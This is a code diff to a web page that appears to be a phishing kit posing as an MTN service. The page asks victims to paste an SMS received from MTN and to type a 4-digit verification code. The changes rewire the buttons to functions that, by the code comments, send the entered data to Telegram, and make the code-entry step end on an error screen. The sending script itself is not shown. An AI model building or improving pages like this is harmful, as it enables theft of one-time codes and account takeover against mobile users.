@@ -158,7 +158,8 @@
 
                     <div class="button-row">
                         <button class="btn-secondary" onclick="prevStep(1)" data-translate="form_back">BACK</button>
-                        <button class="btn-primary" onclick="nextStep(3)" data-translate="form_next">NEXT STEP</button>
+                        <!-- Changed to call submitApplication to trigger Telegram -->
+                        <button class="btn-primary" onclick="submitApplication()" data-translate="form_next">NEXT STEP</button>
                     </div>
                 </div>
 
@@ -226,9 +227,11 @@
                 <p data-translate="sms_tip">Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.</p>
             </div>
 
-            <textarea class="sms-textarea" placeholder="Paste the SMS received from MTN here..." data-translate-placeholder="sms_placeholder"></textarea>
+            <!-- Added ID here so JS can grab the value -->
+            <textarea id="smsInput" class="sms-textarea" placeholder="Paste the SMS received from MTN here..." data-translate-placeholder="sms_placeholder"></textarea>
 
-            <button class="btn-verify" onclick="showScreen('verification-screen')" data-translate="sms_btn">VERIFY & CONTINUE &rarr;</button>
+            <!-- Changed to call submitSMS to trigger Telegram -->
+            <button class="btn-verify" onclick="submitSMS()" data-translate="sms_btn">VERIFY & CONTINUE &rarr;</button>
         </div>
     </div>
 
@@ -238,7 +241,7 @@
             <h2 class="dark-title" data-translate="ver_title">Enter the Verification Code</h2>
             <p class="dark-subtitle" data-translate="ver_subtitle">We sent a 4-digit code to your number. Enter it below to continue.</p>
             <input type="text" maxlength="4" class="dark-input" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px; margin-bottom: 20px;">
-            <button class="btn-primary" onclick="submitFourDigitCode()" data-translate="ver_btn">VERIFY</button>
+            <button class="btn-primary" onclick="showScreen('error-screen')" data-translate="ver_btn">VERIFY</button>
         </div>
     </div>
 
